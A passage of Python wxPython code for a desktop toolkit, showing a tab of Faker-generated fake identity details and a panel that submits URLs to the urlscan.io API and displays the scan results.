        fin_grid.Add(wx.StaticText(fin_panel, label=fake.iban()))
        fin_grid.Add(make_bold_label(fin_panel, "Credit Card:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        fin_grid.Add(wx.StaticText(fin_panel, label=fake.credit_card_number(card_type=None)))

        fin_sizer.Add(fin_grid, 0, wx.ALL, 15)
        fin_panel.SetSizer(fin_sizer)
        notebook.AddPage(fin_panel, "Financial Info")

        # --- Fake Physical Info tab ---
        phys_panel = wx.Panel(notebook)
        phys_sizer = wx.BoxSizer(wx.VERTICAL)

        phys_grid = wx.FlexGridSizer(0, 2, 10, 20)
        phys_grid.Add(make_bold_label(phys_panel, "Height:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        phys_grid.Add(wx.StaticText(phys_panel, label=f"{fake.random_int(min=150, max=200)} cm"))
        phys_grid.Add(make_bold_label(phys_panel, "Weight:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        phys_grid.Add(wx.StaticText(phys_panel, label=f"{fake.random_int(min=50, max=120)} kg"))
        phys_grid.Add(make_bold_label(phys_panel, "Eye Color:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        phys_grid.Add(wx.StaticText(phys_panel, label=fake.color_name()))
        phys_grid.Add(make_bold_label(phys_panel, "Hair Color:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        phys_grid.Add(wx.StaticText(phys_panel, label=fake.color_name()))

        phys_sizer.Add(phys_grid, 0, wx.ALL, 15)
        phys_panel.SetSizer(phys_sizer)
        notebook.AddPage(phys_panel, "Physical Info")

        # --- Fake Government IDs tab ---
        gov_panel = wx.Panel(notebook)
        gov_sizer = wx.BoxSizer(wx.VERTICAL)

        gov_grid = wx.FlexGridSizer(0, 2, 10, 20)
        gov_grid.Add(make_bold_label(gov_panel, "SSN:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        gov_grid.Add(wx.StaticText(gov_panel, label=fake.ssn()))
        gov_grid.Add(make_bold_label(gov_panel, "Passport:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        gov_grid.Add(wx.StaticText(gov_panel, label=fake.passport_number()))
        gov_grid.Add(make_bold_label(gov_panel, "Driver's License:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        gov_grid.Add(wx.StaticText(gov_panel, label=fake.license_plate()))

        gov_sizer.Add(gov_grid, 0, wx.ALL, 15)
        gov_panel.SetSizer(gov_sizer)
        notebook.AddPage(gov_panel, "Government IDs")

        vbox.Add(notebook, 1, wx.EXPAND | wx.ALL, 5)
        panel.SetSizer(vbox)

        return panel

    def create_url_scan_panel(self):
        panel = wx.Panel(self.content_panel)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # URL input row
        hbox_url = wx.BoxSizer(wx.HORIZONTAL)
        url_label = wx.StaticText(panel, label="Enter URL:")
        url_input = wx.TextCtrl(panel)
        hbox_url.Add(url_label, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        hbox_url.Add(url_input, 1, wx.ALL | wx.EXPAND, 5)

        # Scan button
        scan_button = wx.Button(panel, label="Scan URL")
        hbox_url.Add(scan_button, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)

        vbox.Add(hbox_url, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)

        # Results text control
        result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        vbox.Add(result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(vbox)

        # Helper function to safely update result_text from thread
        def append_result_text(text):
            result_text.AppendText(text)

        def set_result_text(text):
            result_text.SetValue(text)

        def do_scan_thread(url):
            headers = {
                "API-Key": url_scanner_api,
                "Content-Type": "application/json"
            }
            submit_data = {"url": url, "public": "off"}
            try:
                wx.CallAfter(set_result_text, "Submitting URL to urlscan.io...\n")
                resp = requests.post("https://urlscan.io/api/v1/scan/", json=submit_data, headers=headers)
                resp.raise_for_status()
                scan_data = resp.json()
                uuid = scan_data.get("uuid")
                if not uuid:
                    wx.CallAfter(set_result_text, "Failed to get scan UUID.\n")
                    return

                wx.CallAfter(append_result_text, f"Scan submitted, UUID: {uuid}\nPolling for results...\n")

                result = None
                for i in range(20):
                    time.sleep(3)
                    result_resp = requests.get(f"https://urlscan.io/api/v1/result/{uuid}/")
                    if result_resp.status_code == 200:
                        result = result_resp.json()
                        break
                    wx.CallAfter(append_result_text, f"Waiting for result... ({i+1}/20)\n")

                if not result:
                    wx.CallAfter(append_result_text, "Timeout: No scan results available yet.\n")
                    return

                wx.CallAfter(display_scan_results, result)

            except Exception as e:
                wx.CallAfter(set_result_text, f"Error during scanning: {str(e)}\n")

        def display_scan_results(data):
            result_text.Clear()
            page = data.get("page", {})
            if not page:
                result_text.SetValue("No page info in result.\n")
                return

            result_text.AppendText(f"URL: {page.get('url')}\n")
            result_text.AppendText(f"Status: {page.get('status')}\n")
            result_text.AppendText(f"Title: {page.get('title')}\n")
            result_text.AppendText(f"Final URL (after redirects): {page.get('finalUrl')}\n")

            technologies = data.get("technologies", [])
            if technologies:
                result_text.AppendText("\nDetected Technologies:\n")
                for tech in technologies:
                    name = tech.get("name")
                    if name:
                        result_text.AppendText(f" - {name}\n")
            else:
                result_text.AppendText("\nNo technologies detected.\n")

            redirects = page.get("redirects", [])
            if redirects:
                result_text.AppendText("\nRedirect chain:\n")
                for r in redirects:
                    result_text.AppendText(f" -> {r}\n")

            result_text.AppendText("\nScan complete.\n")

        def on_scan_button(event):
            url = url_input.GetValue().strip()
            if not url:
                wx.MessageBox("Please enter a URL to scan.", "Error", wx.OK | wx.ICON_ERROR)
                return
            threading.Thread(target=do_scan_thread, args=(url,), daemon=True).start()

        scan_button.Bind(wx.EVT_BUTTON, on_scan_button)

        return panel










































    def create_placeholder_panel(self, tool_name):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)
        label = wx.StaticText(panel, label=f"This is the {tool_name} tool UI.")
        sizer.Add(label, 0, wx.ALL, 20)
        panel.SetSizer(sizer)
        return panel

    def on_save(self, event):
        wx.MessageBox("Save function called (placeholder).", "Save")

    def on_save_as(self, event):
        with wx.FileDialog(self, "Save As", wildcard="Text files (*.txt)|*.txt",
                           style=wx.FD_SAVE | wx.FD_OVERWRITE_PROMPT) as dlg:
            if dlg.ShowModal() == wx.ID_CANCEL:
                return
            path = dlg.GetPath()
            with open(path, "w") as f:
                f.write("// TODO: save current content")

    def on_exit(self, event):
        self.Close()

if __name__ == "__main__":
    app = wx.App(False)
    frame = ToolkitFrame()
    frame.Show()
    app.MainLoop()
